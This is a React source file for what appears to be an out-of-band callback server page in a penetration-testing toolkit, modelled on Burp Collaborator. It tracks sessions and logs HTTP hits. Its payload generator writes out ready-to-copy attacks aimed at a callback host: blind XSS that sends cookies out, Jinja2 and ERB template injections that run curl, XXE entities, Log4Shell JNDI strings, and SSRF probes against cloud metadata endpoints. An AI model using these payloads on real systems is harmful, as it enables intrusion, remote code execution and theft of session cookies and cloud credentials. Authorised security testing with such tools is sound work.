import React, { useState, useEffect, useRef, useCallback } from "react";
import { usePersistedState } from "@/hooks/usePersistedState";

const BASE = import.meta.env.BASE_URL?.replace(/\/$/, "") ?? "";

interface OastCallback {
  receivedAt: string;
  method: string;
  ip: string;
  headers: Record<string, string>;
  query: Record<string, string>;
  body: string;
  path: string;
}

interface OastSession {
  sessionId: string;
  token: string;
  callbackUrl: string;
  label: string;
  createdAt: string;
  callbacks: OastCallback[];
}

interface PayloadExamples {
  ssrf: { label: string; payload: string }[];
  blindXss: { label: string; payload: string }[];
  xxe: { label: string; payload: string }[];
  ssti: { label: string; payload: string }[];
  log4shell: { label: string; payload: string }[];
  deserialization: { label: string; payload: string }[];
  openRedirect: { label: string; payload: string }[];
  blindSsrf: { label: string; payload: string }[];
}

export default function OastServer() {
  const [sessions, setSessions] = usePersistedState<OastSession[]>("oast-sessions", []);
  const [activeSessionId, setActiveSessionId] = usePersistedState<string | null>("oast-active", null);
  const [payloads, setPayloads] = useState<PayloadExamples | null>(null);
  const [label, setLabel] = useState("My OAST Session");
  const [creating, setCreating] = useState(false);
  const [selectedClass, setSelectedClass] = useState<keyof PayloadExamples>("ssrf");
  const [copied, setCopied] = useState<string | null>(null);
  const [polling, setPolling] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [expandedCb, setExpandedCb] = useState<number | null>(null);

  const activeSession = sessions.find(s => s.sessionId === activeSessionId) ?? null;

  const poll = useCallback(async (sessionId: string) => {
    if (polling) return;
    setPolling(true);
    try {
      const r = await fetch(`${BASE}/api/oast/session/${sessionId}`, { credentials: "include" });
      if (!r.ok) return;
      const data: OastSession = await r.json();
      setSessions(prev => prev.map(s => s.sessionId === sessionId ? { ...s, callbacks: data.callbacks } : s));
    } catch {}
    setPolling(false);
  }, [polling]);

  useEffect(() => {
    if (!activeSessionId) return;
    pollRef.current = setInterval(() => poll(activeSessionId), 3000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [activeSessionId]);

  async function createSession() {
    setCreating(true);
    try {
      const r = await fetch(`${BASE}/api/oast/session`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ label }),
      });
      if (!r.ok) throw new Error(await r.text());
      const data = await r.json();
      const session: OastSession = {
        sessionId: data.sessionId,
        token: data.token,
        callbackUrl: data.callbackUrl,
        label,
        createdAt: new Date().toISOString(),
        callbacks: [],
      };
      setSessions(prev => [session, ...prev.slice(0, 9)]);
      setActiveSessionId(session.sessionId);
      setPayloads(data.payloads);
    } catch (e: any) {
      alert("Error: " + e.message);
    }
    setCreating(false);
  }

  async function deleteSession(sessionId: string) {
    try {
      await fetch(`${BASE}/api/oast/session/${sessionId}`, { method: "DELETE", credentials: "include" });
    } catch {}
    setSessions(prev => prev.filter(s => s.sessionId !== sessionId));
    if (activeSessionId === sessionId) setActiveSessionId(null);
  }

  function copy(text: string, key: string) {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  }

  const payloadClasses: Array<{ key: keyof PayloadExamples; label: string; color: string }> = [
    { key: "ssrf",             label: "SSRF",             color: "text-red-400" },
    { key: "blindXss",         label: "Blind XSS",        color: "text-orange-400" },
    { key: "xxe",              label: "XXE",               color: "text-yellow-400" },
    { key: "ssti",             label: "SSTI",              color: "text-purple-400" },
    { key: "log4shell",        label: "Log4Shell",         color: "text-rose-400" },
    { key: "deserialization",  label: "Deserialization",   color: "text-pink-400" },
    { key: "openRedirect",     label: "Open Redirect",     color: "text-cyan-400" },
    { key: "blindSsrf",        label: "Blind SSRF",        color: "text-blue-400" },
  ];

  return (
    <div className="min-h-screen bg-black text-white font-mono p-6 space-y-6">
      <div className="border border-primary/20 bg-primary/5 p-4">
        <div className="text-primary text-xs font-bold uppercase tracking-widest mb-1">OAST — Out-of-Band Callback Server</div>
        <div className="text-white/50 text-xs">
          Real OOB callback infrastructure. Create a unique token URL — inject it into SSRF, Blind XSS, XXE, Log4Shell, SSTI, and deserialization payloads.
          Any HTTP hit to your callback URL is recorded here in real time. Equivalent to Burp Collaborator / interactsh.
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Session panel */}
        <div className="space-y-4">
          <div className="border border-white/10 p-4 space-y-3">
            <div className="text-white/60 text-xs uppercase tracking-widest">New Session</div>
            <input
              className="w-full bg-black border border-white/20 text-white text-xs px-3 py-2 focus:outline-none focus:border-primary"
              placeholder="Session label (e.g. target.com scan)"
              value={label}
              onChange={e => setLabel(e.target.value)}
            />
            <button
              onClick={createSession}
              disabled={creating}
              className="w-full bg-primary text-black text-xs font-bold py-2 uppercase tracking-widest hover:bg-primary/90 disabled:opacity-50"
            >
              {creating ? "Creating..." : "+ Create Callback Session"}
            </button>
          </div>

          <div className="border border-white/10 p-4 space-y-2">
            <div className="text-white/60 text-xs uppercase tracking-widest mb-2">Recent Sessions</div>
            {sessions.length === 0 && <div className="text-white/30 text-xs">No sessions yet</div>}
            {sessions.map(s => (
              <div
                key={s.sessionId}
                onClick={() => { setActiveSessionId(s.sessionId); setPayloads(null); }}
                className={`cursor-pointer border p-2 space-y-1 transition-colors ${s.sessionId === activeSessionId ? "border-primary bg-primary/10" : "border-white/10 hover:border-white/30"}`}
              >
                <div className="text-xs text-white truncate">{s.label}</div>
                <div className="flex items-center justify-between">
                  <div className={`text-[10px] ${s.callbacks.length > 0 ? "text-green-400" : "text-white/30"}`}>
                    {s.callbacks.length} callback{s.callbacks.length !== 1 ? "s" : ""}
                  </div>
                  <button
                    onClick={e => { e.stopPropagation(); deleteSession(s.sessionId); }}
                    className="text-red-400/50 hover:text-red-400 text-[10px]"
                  >
                    ✕
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Main panel */}
        <div className="lg:col-span-2 space-y-4">
          {!activeSession ? (
            <div className="border border-white/10 p-8 text-center text-white/30 text-sm">
              Create or select a session to get your unique callback URL
            </div>
          ) : (
            <>
              {/* Callback URL */}
              <div className="border border-green-500/30 bg-green-900/10 p-4 space-y-2">
                <div className="text-green-400 text-xs uppercase tracking-widest">Your Unique Callback URL</div>
                <div className="flex items-center gap-2">
                  <code className="text-green-300 text-xs break-all flex-1 bg-black/50 px-2 py-1">
                    {activeSession.callbackUrl}
                  </code>
                  <button
                    onClick={() => copy(activeSession.callbackUrl, "url")}
                    className="text-xs border border-green-500/30 text-green-400 px-2 py-1 hover:bg-green-900/30 shrink-0"
                  >
                    {copied === "url" ? "Copied!" : "Copy"}
                  </button>
                </div>
                <div className="text-white/40 text-[10px]">
                  Token: <span className="text-primary">{activeSession.token}</span> · 
                  Polling every 3s · Session: {activeSession.sessionId}
                </div>
              </div>

              {/* Payload examples */}
              <div className="border border-white/10 p-4 space-y-3">
                <div className="text-white/60 text-xs uppercase tracking-widest">Payload Injection Examples</div>
                <div className="flex flex-wrap gap-1">
                  {payloadClasses.map(({ key, label: lbl, color }) => (
                    <button
                      key={key}
                      onClick={() => setSelectedClass(key)}
                      className={`text-[10px] px-2 py-0.5 border transition-colors ${selectedClass === key ? `border-current ${color} bg-white/5` : "border-white/20 text-white/40 hover:border-white/40"}`}
                    >
                      {lbl}
                    </button>
                  ))}
                </div>

                <div className="space-y-2">
                  {(payloads ?? generateClientPayloads(activeSession.callbackUrl))[selectedClass]?.map((p: { label: string; payload: string }, i: number) => (
                    <div key={i} className="border border-white/10 p-2 space-y-1">
                      <div className="text-white/50 text-[10px]">{p.label}</div>
                      <div className="flex items-start gap-2">
                        <code className="text-primary text-[10px] break-all flex-1 bg-black/50 px-2 py-1 leading-relaxed">
                          {p.payload}
                        </code>
                        <button
                          onClick={() => copy(p.payload, `p_${i}`)}
                          className="text-[10px] border border-white/20 text-white/50 px-2 py-1 hover:text-white shrink-0"
                        >
                          {copied === `p_${i}` ? "✓" : "Copy"}
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Callbacks received */}
              <div className="border border-white/10 p-4 space-y-3">
                <div className="flex items-center justify-between">
                  <div className="text-white/60 text-xs uppercase tracking-widest">
                    Callbacks Received {activeSession.callbacks.length > 0 && <span className="text-green-400">({activeSession.callbacks.length})</span>}
                  </div>
                  <div className="flex items-center gap-2">
                    <div className={`w-1.5 h-1.5 rounded-full ${polling ? "bg-green-400 animate-pulse" : "bg-white/20"}`} />
                    <span className="text-[10px] text-white/40">{polling ? "Polling..." : "Live"}</span>
                  </div>
                </div>

                {activeSession.callbacks.length === 0 ? (
                  <div className="border border-white/5 p-6 text-center">
                    <div className="text-white/30 text-xs mb-1">Waiting for callbacks...</div>
                    <div className="text-white/20 text-[10px]">
                      Inject your callback URL into a target then watch hits appear here in real time
                    </div>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {[...activeSession.callbacks].reverse().map((cb, i) => (
                      <div key={i} className="border border-green-500/30 bg-green-900/5 p-3 space-y-2">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <span className="text-green-400 text-xs font-bold">{cb.method}</span>
                            <span className="text-white/60 text-xs">{cb.ip}</span>
                            <span className={`text-[10px] px-1 py-0.5 border ${
                              cb.method === "POST" ? "border-orange-500/40 text-orange-400" : "border-green-500/40 text-green-400"
                            }`}>
                              OOB HIT
                            </span>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className="text-white/30 text-[10px]">{new Date(cb.receivedAt).toLocaleTimeString()}</span>
                            <button
                              onClick={() => setExpandedCb(expandedCb === i ? null : i)}
                              className="text-[10px] text-white/40 hover:text-white border border-white/20 px-1"
                            >
                              {expandedCb === i ? "–" : "+"}
                            </button>
                          </div>
                        </div>
                        {expandedCb === i && (
                          <div className="space-y-2 border-t border-white/10 pt-2">
                            <div>
                              <div className="text-[10px] text-white/40 mb-1">Headers</div>
                              <pre className="text-[10px] text-white/60 bg-black/50 p-2 overflow-x-auto max-h-32">
                                {JSON.stringify(cb.headers, null, 2)}
                              </pre>
                            </div>
                            {cb.body && (
                              <div>
                                <div className="text-[10px] text-white/40 mb-1">Body</div>
                                <pre className="text-[10px] text-white/60 bg-black/50 p-2 overflow-x-auto max-h-24">{cb.body}</pre>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

function generateClientPayloads(cbUrl: string) {
  const enc = encodeURIComponent(cbUrl);
  return {
    ssrf: [
      { label: "URL parameter", payload: `?url=${enc}` },
      { label: "Redirect param", payload: `?redirect=${enc}` },
      { label: "Webhook param",  payload: `?webhook=${enc}` },
    ],
    blindXss: [
      { label: "Script src",     payload: `<script src="${cbUrl}"></script>` },
      { label: "Fetch on error", payload: `"><img src=x onerror=fetch('${cbUrl}')>` },
      { label: "Fetch cookie",   payload: `';fetch('${cbUrl}?c='+document.cookie)//` },
    ],
    xxe: [
      { label: "System entity",  payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${cbUrl}">]><foo>&xxe;</foo>` },
    ],
    ssti: [
      { label: "Jinja2",         payload: `{{config.__class__.__init__.__globals__['os'].popen('curl ${cbUrl}').read()}}` },
      { label: "ERB Ruby",       payload: `<%= \`curl ${cbUrl}\` %>` },
    ],
    log4shell: [
      { label: "JNDI/DNS",       payload: `\${jndi:dns://${cbUrl.replace(/https?:\/\//, "")}/a}` },
      { label: "JNDI/HTTP",      payload: `\${jndi:ldap://${cbUrl.replace(/https?:\/\//, "")}/exploit}` },
    ],
    deserialization: [
      { label: "PHP phar",        payload: `phar://${cbUrl}/test.txt` },
    ],
    openRedirect: [
      { label: "next param",     payload: `?next=${enc}` },
      { label: "return_url",     payload: `?return_url=${enc}` },
    ],
    blindSsrf: [
      { label: "AWS IMDSv1",      payload: `?url=http://169.254.169.254/latest/meta-data/` },
      { label: "GCP metadata",    payload: `?url=http://metadata.google.internal/computeMetadata/v1/` },
    ],
  };
}
